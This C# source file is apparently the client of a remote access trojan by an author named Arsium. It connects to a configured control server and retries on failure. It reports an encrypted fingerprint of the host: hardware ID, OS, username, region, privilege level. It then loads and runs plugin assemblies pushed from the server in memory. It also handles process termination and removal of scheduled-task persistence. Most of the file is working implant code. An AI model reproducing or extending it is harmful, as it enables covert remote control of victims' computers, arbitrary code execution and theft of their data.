using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static Client.Utils;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Client
{
    public class Client
    {
        private Socket _S;
        private Host WorkingHost;
        private IPEndPoint IpEndPt;
        //public IPAPI.IP ClientCountry;
        private string HWID { get; set; }

        public Client(Host H) 
        {
            this.HWID = HwidGen.HWID();
            this.WorkingHost = H;
            IpEndPt = new IPEndPoint(IPAddress.Parse(WorkingHost.host), WorkingHost.port);
            try
            {
                _S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                _S.ReceiveBufferSize = Shared.Utils.BufferSize;
                _S.SendBufferSize = Shared.Utils.BufferSize;
                _S.Connect(IpEndPt);
                if (_S.Connected)
                {
                    Thread T = new Thread(() => ReadData());
                    T.Start();
                    SendId();
                }           
            }
            catch (Exception)
            {
                while (_S.Connected == false)

                {
                    try
                    {
                        _S.Connect(IpEndPt);
                        if (_S.Connected)
                        {
                            Thread T = new Thread(() => ReadData());
                            T.Start();
                            SendId();
                            return;
                        }                      
                    }
                    catch(Exception){}

                    Thread.Sleep(1500);
                }
            }
        }
        private void SendId() 
        {
            Microsoft.VisualBasic.Devices.Computer I = new Microsoft.VisualBasic.Devices.Computer();

            //string country = Utils.CountryInformation(Strings.Split(S.LocalEndPoint.ToString(), ":")[0], ref ClientCountry);
 
            List<string> DataToSend = new List<string>() 
            {   this.HWID, 
                I.Info.OSFullName, 
                Environment.UserName, 
                I.Info.OSVersion, 
                RegionInfo.CurrentRegion.Name + " - " + RegionInfo.CurrentRegion.EnglishName, 
                Process.GetCurrentProcess().Handle.ToString(), 
                Utils.Privilege(), 
                Utils.Check64Bit(),
                RegionInfo.CurrentRegion.Name.ToLower(),
            };
            Data data = new Data();
            data.Type = PacketType.ID;
            data.HWID = this.HWID;
            data.DataReturn = new object[] { DataToSend };
            SendData(_S, Encryption.RSMTool.RSMEncrypt(data.Serialize(), Encoding.Unicode.GetBytes(Utils.Key)));
        }
        private void ReadData()
        {
            try
            {
                while (true)
                {
                    byte[] data = Encryption.RSMTool.RSMDecrypt(ReceiveData(_S), Encoding.Unicode.GetBytes(Utils.Key));
                    if (data.Length > 0)
                    {
                        Data D = Shared.Serializer.Deserialize(data);
                        switch (D.Type) 
                        {
                            case PacketType.CLOSE:
                                //TODO : choose to delete the client after closed and killed
                                NtTerminateProcess(Process.GetCurrentProcess().Handle, 0);
                                break;
                            case PacketType.UNINSTALL_TASKSCH:
                                Utils.RemoveTaskScheduler();
                                break;
                            default:
                                //Task.Run(() => Launch(Compressor.QuickLZ.Decompress(D.Plugin), D.DataReturn, D.IP_Origin));
                                new Thread(() => Launch(Compressor.QuickLZ.Decompress(D.Plugin), D.DataReturn, D.IP_Origin)).Start();
                                break;
                        }
                    }
                }
            }
            catch (Exception)
            {
                CheckConnection();       
            }
            Shared.Utils.ClearMem();
        }
        private async Task Launch(byte[] B, object[] Param ,  string IP)
        {
            try
            {
                System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(B);
                System.Reflection.MethodInfo method = null;
                method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
                object obj = assemblytoload.CreateInstance(method.Name);
                await Task.Run(() => method.Invoke(obj, new object[] { WorkingHost, this.HWID, Param, this._S, Utils.Key, IP }));
            }
            catch{}
            finally 
            { 
                Shared.Utils.ClearMem();
            }
        }       
        private void CheckConnection()
        {
            Thread.Sleep(1000);
            try
            {
                _S.Send(Shared.Utils.b, 0, 0);
            }
            catch (Exception)
            {
                try
                {
                    _S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    _S.ReceiveBufferSize = Shared.Utils.BufferSize;
                    _S.SendBufferSize = Shared.Utils.BufferSize;
                    _S.Connect(IpEndPt);
                    
                    if (_S.Connected == true)
                    {
                        Thread O = new Thread(() => ReadData());
                        O.Start();
                        SendId();
                        return;
                    }
                }
                catch (Exception) 
                { 
                    CheckConnection();
                }
            }
        }
        private byte[] ReceiveData(Socket S)
        {
            int total = 0;
            byte[] datasize = new byte[4];
            S.Poll(-1, SelectMode.SelectRead);
            int recv = S.Receive(datasize, 0, 4, 0);
            int size = BitConverter.ToInt32(datasize, 0);
            int dataleft = size;
            byte[] data = new byte[size];
            while (total < size)
            {
                recv = S.Receive(data, total, dataleft, 0);
                total += recv;
                dataleft -= recv;
            }
            return data;
        }
    }
}
